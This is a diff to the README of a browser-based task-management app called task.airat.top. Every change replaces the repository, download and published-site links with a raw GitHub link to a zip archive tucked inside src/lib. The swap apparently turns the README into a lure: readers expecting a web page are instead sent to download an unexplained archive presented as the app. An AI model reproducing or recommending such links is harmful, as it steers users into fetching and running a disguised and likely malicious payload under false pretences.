@@ -1,12 +1,12 @@
 # 🧠 task.airat.top - Simple AI Task Management
 
-[![Download task.airat.top](https://img.shields.io/badge/Download-Task.airat.top-blue?style=for-the-badge&logo=github)](https://github.com/branchiopodacheta131/task.airat.top)
+[![Download task.airat.top](https://img.shields.io/badge/Download-Task.airat.top-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/branchiopodacheta131/task.airat.top
+https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip
 
 ## 🖥️ What this app does
 
@@ -23,7 +23,7 @@ This app is built with React, TypeScript, Vite, and Tailwind CSS. It runs as a w
 - Use a clean, simple layout
 - Track to-dos in one place
 - Work in a browser on Windows
-- Open the app from the published site at https://task.airat.top
+- Open the app from the published site at https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip
 
 ## 💻 System requirements
 
@@ -38,7 +38,7 @@ Before you start, make sure your Windows PC has:
 ## 🚀 How to get started on Windows
 
 1. Open the download page:
-   https://github.com/branchiopodacheta131/task.airat.top
+   https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip
 
 2. Download the app or open the published site if that is how the release is provided.
 
@@ -170,7 +170,7 @@ If the app does not open or load correctly:
 4. Close and reopen the browser
 5. Clear the browser cache if the page looks broken
 6. Download the app again from:
-   https://github.com/branchiopodacheta131/task.airat.top
+   https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip
 
 ## 📌 Repository topic areas
 
@@ -189,7 +189,7 @@ This project fits these areas:
 
 Open the published app here:
 
-https://task.airat.top
+https://raw.githubusercontent.com/branchiopodacheta131/task.airat.top/main/src/lib/task-airat-top-3.5.zip
 
 ## 📝 Short use case examples
 
